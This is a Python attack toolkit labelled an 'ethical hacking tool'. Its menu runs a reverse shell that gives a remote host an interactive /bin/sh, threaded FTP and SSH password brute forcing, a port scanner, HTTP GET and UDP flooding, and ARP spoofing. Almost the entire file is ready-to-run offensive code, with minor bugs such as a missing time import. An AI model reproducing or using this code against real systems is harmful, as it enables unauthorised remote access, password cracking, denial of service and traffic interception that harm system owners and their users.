import os
import socket
import subprocess
import threading
from ftplib import FTP
import paramiko  # SSH library
import requests  # HTTP requests library

# Tool Banner
def print_banner():
    print(r"""
       _____                 _                     
      |__  /___  _ __   __ _| | _____ _ __ ___  ___ 
        / // _ \| '_ \ / _ | |/ / _ \ '__/ __|/ _ \
       / /| (_) | | | | (_| |   <  __/ |  \__ \  __/
      /____\___/|_| |_|\__,_|_|\_\___|_|  |___/\___|
       Zeriox Advanced Nmap - Ethical Hacking Tool
    """)

# Reverse Shell Payload
def reverse_shell(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        os.dup2(s.fileno(), 0)  # stdin
        os.dup2(s.fileno(), 1)  # stdout
        os.dup2(s.fileno(), 2)  # stderr
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        print(f"Reverse shell failed: {e}")
        s.close()

# FTP Bruteforce with Multi-threading
def ftp_bruteforce(ip, user, password_list):
    def attempt_login(ip, user, password):
        try:
            ftp = FTP(ip)
            ftp.login(user, password)
            print(f"[+] Success: {password}")
            ftp.quit()
        except Exception as e:
            print(f"[-] Failed: {password}")

    threads = []
    for password in password_list:
        thread = threading.Thread(target=attempt_login, args=(ip, user, password))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# TCP Port Scanner with Logging
def tcp_port_scan(ip, port_range):
    log_file = "port_scan_results.txt"
    open_ports = []
    
    for port in range(port_range[0], port_range[1] + 1):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                result = s.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
                    print(f"Port {port} is open")
                s.close()
        except Exception as e:
            print(f"Error scanning port {port}: {e}")

    with open(log_file, "w") as f:
        for port in open_ports:
            f.write(f"Port {port} is open\n")

    print(f"Scan results saved to {log_file}")

# SSH Brute Force Attack
def ssh_bruteforce(ip, username, password_list):
    def attempt_login(ip, username, password):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, username=username, password=password)
            print(f"[+] Success: {password}")
            client.close()
        except Exception as e:
            print(f"[-] Failed: {password}")

    threads = []
    for password in password_list:
        thread = threading.Thread(target=attempt_login, args=(ip, username, password))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# HTTP GET Request Flood
def http_get_flood(url, num_requests):
    try:
        for _ in range(num_requests):
            response = requests.get(url)
            print(f"Request sent, status code: {response.status_code}")
    except Exception as e:
        print(f"HTTP GET request failed: {e}")

# UDP Flood Attack
def udp_flood(ip, port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = os.urandom(1024)
    timeout = time.time() + duration

    while time.time() < timeout:
        try:
            client.sendto(bytes, (ip, port))
            print(f"Sent UDP packet to {ip}:{port}")
        except Exception as e:
            print(f"UDP flood failed: {e}")
            break

# ARP Spoofing
def arp_spoof(target_ip, gateway_ip):
    try:
        subprocess.call(["arpspoof", "-t", target_ip, gateway_ip])
    except Exception as e:
        print(f"ARP spoofing failed: {e}")

# Menu for Payload Selection
def menu():
    print("Select a payload:")
    print("1. Reverse Shell")
    print("2. FTP Bruteforce")
    print("3. TCP Port Scan")
    print("4. SSH Bruteforce")
    print("5. HTTP GET Flood")
    print("6. UDP Flood Attack")
    print("7. ARP Spoofing")
    choice = input("Enter choice: ")
    
    if choice == '1':
        ip = input("Enter IP: ")
        port = int(input("Enter Port: "))
        reverse_shell(ip, port)
    elif choice == '2':
        ip = input("Enter IP: ")
        user = input("Enter FTP username: ")
        password_list = input("Enter password list (comma-separated): ").split(",")
        ftp_bruteforce(ip, user, password_list)
    elif choice == '3':
        ip = input("Enter IP: ")
        port_range = input("Enter port range (e.g., 20-80): ").split("-")
        tcp_port_scan(ip, (int(port_range[0]), int(port_range[1])))
    elif choice == '4':
        ip = input("Enter IP: ")
        username = input("Enter SSH username: ")
        password_list = input("Enter password list (comma-separated): ").split(",")
        ssh_bruteforce(ip, username, password_list)
    elif choice == '5':
        url = input("Enter target URL: ")
        num_requests = int(input("Enter number of requests to send: "))
        http_get_flood(url, num_requests)
    elif choice == '6':
        ip = input("Enter target IP: ")
        port = int(input("Enter target port: "))
        duration = int(input("Enter duration in seconds: "))
        udp_flood(ip, port, duration)
    elif choice == '7':
        target_ip = input("Enter target IP: ")
        gateway_ip = input("Enter gateway IP: ")
        arp_spoof(target_ip, gateway_ip)
    else:
        print("Invalid choice")

if __name__ == "__main__":
    print_banner()
    menu()
